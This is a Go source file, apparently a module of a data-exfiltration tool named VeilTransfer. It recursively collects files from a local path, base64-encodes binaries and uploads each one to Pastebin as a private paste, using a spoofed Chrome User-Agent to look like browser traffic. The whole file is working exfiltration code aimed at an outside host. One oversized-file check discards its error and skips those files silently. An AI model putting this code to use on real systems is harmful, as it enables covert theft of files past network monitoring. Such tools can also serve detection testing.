package transfer

import (
    "bytes"
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "mime"
    "net/http"
    "net/url"
    "os"
    "path/filepath"
    "VeilTransfer/utils"
    "strings"
)

const maxPastebinSize = 512 * 1024 // 512 kilobytes

func UploadPastebin(apiDevKey, localPath string, includePatterns []string) error {
    // Define the upload function for Pastebin
    uploadFunc := func(filePath, remoteFilePath string) error {
        // Skip directories
        fileInfo, err := os.Stat(filePath)
        if err != nil {
            return fmt.Errorf("[-] failed to get file info: %s", err)
        }
        if fileInfo.IsDir() {
            fmt.Printf("[*] Skipping directory: %s\n", filePath)
            return nil
        }

        return uploadFileToPastebin(apiDevKey, filePath)
    }

    // Call WalkAndUpload with the upload function for Pastebin
    return utils.WalkAndUpload(localPath, "", includePatterns, uploadFunc)
}

func uploadFileToPastebin(apiDevKey, filePath string) error {
    // Check file size before reading
    fileInfo, err := os.Stat(filePath)
    if err != nil {
        return fmt.Errorf("[-] failed to get file info: %s", err)
    }
    if fileInfo.Size() > maxPastebinSize {
       fmt.Errorf("[-] Error: %s (exceeds maximum size of 512 KB)", filePath)
       return nil
    }

    // Read the content of the file
    fileContent, err := ioutil.ReadFile(filePath)
    if err != nil {
        return fmt.Errorf("[-] failed to read file: %s", err)
    }

    // Determine the MIME type of the file
    mimeType := mime.TypeByExtension(filepath.Ext(filePath))
    if mimeType == "" {
        // If MIME type cannot be determined, assume it's plaintext
        mimeType = "text/plain"
    }

    // Convert the content to base64 if it's not plaintext
    var pasteCode string
    if !strings.HasPrefix(mimeType, "text/") {
        pasteCode = base64.StdEncoding.EncodeToString(fileContent)
    } else {
        pasteCode = string(fileContent)
    }

    apiURL := "https://pastebin.com/api/api_post.php"

    // Prepare the data for the POST request
    data := url.Values{}
    data.Set("api_dev_key", apiDevKey)
    data.Set("api_paste_code", pasteCode)
    data.Set("api_option", "paste")
    data.Set("api_paste_private", "1")
    data.Set("api_paste_name", filepath.Base(filePath))

    // Create a new POST request
    req, err := http.NewRequest("POST", apiURL, bytes.NewBufferString(data.Encode()))
    if err != nil {
        return fmt.Errorf("[-] failed to create request: %s", err)
    }

    // Set the content-type header and user-agent
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")

    // Perform the request
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return fmt.Errorf("[-] failed to perform request: %s", err)
    }
    defer resp.Body.Close()

    // Check if the response status is not OK
    if resp.StatusCode != http.StatusOK {
        return fmt.Errorf("\n[-] failed to upload to Pastebin: received status code %d", resp.StatusCode)
    }

    // Read and return the response
    var result bytes.Buffer
    _, err = result.ReadFrom(resp.Body)
    if err != nil {
        return fmt.Errorf("[-] failed to read response: %s", err)
    }

    fmt.Printf("\n[*] Successfully uploaded %s\n[*] Pastebin URL: %s\n", filePath, result.String())

    return nil
}